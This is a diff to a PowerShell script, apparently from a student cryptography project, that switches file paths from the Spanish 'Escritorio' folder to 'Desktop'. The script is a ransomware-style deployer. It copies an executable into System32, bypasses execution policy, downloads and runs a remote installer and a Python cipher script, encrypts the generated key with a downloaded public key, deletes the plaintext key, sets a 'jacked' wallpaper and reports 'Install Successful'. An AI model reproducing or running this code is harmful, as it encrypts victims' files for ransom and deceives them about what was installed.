@@ -1,5 +1,5 @@
 Invoke-Command -ScriptBlock {
-    Copy-Item "$Env:userprofile\Escritorio\Office.exe" -Destination $Env:windir\System32
+    Copy-Item $Env:userprofile\Desktop\Office.exe -Destination $Env:windir\System32
     Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
     if($?){
         choco install python3 -y
@@ -8,9 +8,9 @@ Invoke-Command -ScriptBlock {
 	$urlsc = 'https://raw.githubusercontent.com/El3ctrix/Proyecto-Cripto-CERT/main/Cipher.py'
 	$urlpk = 'https://raw.githubusercontent.com/El3ctrix/Proyecto-Cripto-CERT/main/public.pem'
 	$urlimg = 'https://github.com/El3ctrix/Proyecto-Cripto-CERT/raw/main/wallpaper.jpg'
-    Invoke-WebRequest -Uri $urlsc -OutFile $Env:userprofile\Escritorio\script.py
-	Invoke-WebRequest -Uri $urlpk -OutFile $Env:userprofile\Escritorio\public.pem
-	Invoke-WebRequest -Uri $urlimg -OutFile $Env:userprofile\Escritorio\jacked.jpg
+        Invoke-WebRequest -Uri $urlsc -OutFile $Env:userprofile\Desktop\script.py
+	Invoke-WebRequest -Uri $urlpk -OutFile $Env:userprofile\Desktop\public.pem
+	Invoke-WebRequest -Uri $urlimg -OutFile $Env:userprofile\Desktop\jacked.jpg
 	Function Set-WallPaper($Image) {
     	Add-Type -TypeDefinition @" 
     	using System; 
@@ -36,9 +36,9 @@ Invoke-Command -ScriptBlock {
 	pip install pycryptodome
 	pip install pbkdf2
 	& python.exe script.py
-	& openssl rsautl -encrypt -pubin -inkey $Env:userprofile\Escritorio\public.pem -in $Env:userprofile\Escritorio\key.bin -out $Env:userprofile\Escritorio\keyenc.enc
-	Remove-Item $Env:userprofile\Escritorio\key.bin
-	Set-WallPaper -Image "$Env:userprofile\Escritorio\jacked.jpg"
+	& openssl rsautl -encrypt -pubin -inkey $Env:userprofile\Desktop\public.pem -in $Env:userprofile\Desktop\key.bin -out $Env:userprofile\Desktop\keyenc.enc
+	Remove-Item $Env:userprofile\Desktop\key.bin
+	Set-WallPaper -Image $Env:userprofile\Desktop\jacked.jpg
 	Write-Host 'Install Successful'
     } else {
         Write-Host 'Install Failed'
